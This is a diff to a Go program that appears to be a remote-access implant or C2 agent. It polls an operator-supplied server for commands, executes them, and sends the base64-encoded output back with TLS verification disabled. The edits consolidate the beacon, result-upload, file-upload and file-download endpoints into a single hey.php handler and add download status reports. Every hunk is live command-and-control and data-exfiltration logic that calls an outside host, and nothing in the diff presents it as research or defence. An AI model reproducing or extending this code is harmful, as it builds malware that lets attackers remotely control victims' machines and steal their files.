@@ -27,7 +27,7 @@ sEnc := b64.StdEncoding.EncodeToString([]byte(data))
 
 
 http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-_, err := http.Get(os.Args[2]+"/res.php?id="+id+"&res=" + sEnc )
+_, err := http.Get(os.Args[2]+"/hey.php?m=res&id="+id+"&res=" + sEnc )
 if err != nil {
 	fmt.Println(err)
 
@@ -68,7 +68,7 @@ func hey(){
 
 id := os.Args[1]
 http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-res, err := http.Get(os.Args[2]+"/cmds.php?id="+id+"&o=G")
+res, err := http.Get(os.Args[2]+"/hey.php?m=cmds&id="+id+"&o=G")
 if err != nil {
 	fmt.Println(err)
 	time.Sleep(10 * time.Second)
@@ -101,7 +101,7 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
      
       b64Output := b64.StdEncoding.EncodeToString([]byte(string(Output)))
       http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-      gimme, err := http.Get(os.Args[2]+"/res.php?res="+b64Output+"&id="+id)
+      gimme, err := http.Get(os.Args[2]+"/hey.php?m=res&res="+b64Output+"&id="+id)
       if err != nil {
 	fmt.Println(err)
 	time.Sleep(10 * time.Second)
@@ -130,7 +130,7 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
       filemsg :="Uploading " + string(file)
       filemsgEnc := b64.StdEncoding.EncodeToString([]byte(filemsg))
       
-      msgup, err := http.Get(os.Args[2]+"/res.php?res="+filemsgEnc+"&id="+id)
+      msgup, err := http.Get(os.Args[2]+"/hey.php?m=res&res="+filemsgEnc+"&id="+id)
       if err != nil {
        
 	fmt.Println(err)
@@ -138,7 +138,7 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
 	return
 	}
       fmt.Println(msgup)
-      gimme, err := http.Post(os.Args[2]+"/up.php?id="+id, ct, body)
+      gimme, err := http.Post(os.Args[2]+"/hey.php?m=up&id="+id, ct, body)
       if err != nil {
 	fmt.Println(err)
 	time.Sleep(10 * time.Second)
@@ -152,9 +152,22 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
        
        http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
        
+       
+       
       urldl := strings.Split(line, ":")[2] + ":" + strings.Split(line, ":")[3] 
       pathdl := strings.Split(line, ":")[4]      
       
+      filemsg :="Downloaing " + string(urldl) + " to " + string(pathdl)
+      filemsgEnc := b64.StdEncoding.EncodeToString([]byte(filemsg))
+      
+      msgup, err := http.Get(os.Args[2]+"/hey.php?m=res&res="+filemsgEnc+"&id="+id)
+      if err != nil {
+       
+	fmt.Println(err)
+	time.Sleep(10 * time.Second)
+	return
+	}
+      fmt.Println(msgup)
      
 
     fileURL, err := url.Parse(urldl)
